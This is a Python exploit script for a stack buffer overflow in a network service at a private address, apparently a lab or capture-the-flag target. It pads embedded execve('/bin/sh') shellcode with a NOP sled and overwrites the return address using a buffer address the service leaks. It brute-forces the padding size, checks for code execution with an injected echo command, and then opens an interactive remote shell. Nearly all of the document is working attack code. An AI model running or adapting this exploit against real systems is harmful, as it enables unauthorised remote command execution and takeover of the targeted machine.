import struct
import socket
import time


HOST = '192.168.56.103'
PORT = 4321

SHELLCODE = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'





def read(sock) :
    received = sock.recv(1024)
    return received.decode()


def create_msg(pad_size, buf_start_addr, shellcode) :
    if pad_size - len(shellcode) <= 0 :
        return None
    
    nop_pad = b'\x90' * (pad_size - len(shellcode)) # \x41 = A
    eip = struct.pack("<Q", buf_start_addr + int(pad_size / 2))
    return nop_pad + shellcode + eip + b'\x0a' # \x0a = \n


def start_shell(sock) :
    print("Starting shell")
    while True :
        command = input("$ ") + ";\n"

        if command == "stop;\n" :
            break

        sock.send(command.encode())

        while True :
            try :
                sock.settimeout(2.0)
                print(read(sock))
            except Exception :
                break

    sock.close()


def test_pad_size(pad_size, host, port, shellcode) :
    print("Testing padding size : ", pad_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    first = read(sock)
    buf_start_addr = int(first.split()[0], 0)
    msg = create_msg(pad_size, buf_start_addr, shellcode)

    if msg == None :
        return False

    n = sock.send(msg)

    try :
        ls_command = "echo injected;\n"
        # print("Sending ls command...")
        sock.send(ls_command.encode())

        time.sleep(0.1)

        # print("Reading reply...")
        reply = sock.recv(1024)
        if "injected" in reply.decode() :
            print("Required padding size : ", pad_size)
            start_shell(sock)
        else :
            return False
    except Exception as msg :
        # print("Exception : ", msg)
        return False

    return True





pad_size = len(SHELLCODE)
pad_size_found = False

while not pad_size_found and pad_size + len(SHELLCODE) < 255 :
    pad_size += 1
    pad_size_found = test_pad_size(pad_size, HOST, PORT, SHELLCODE)








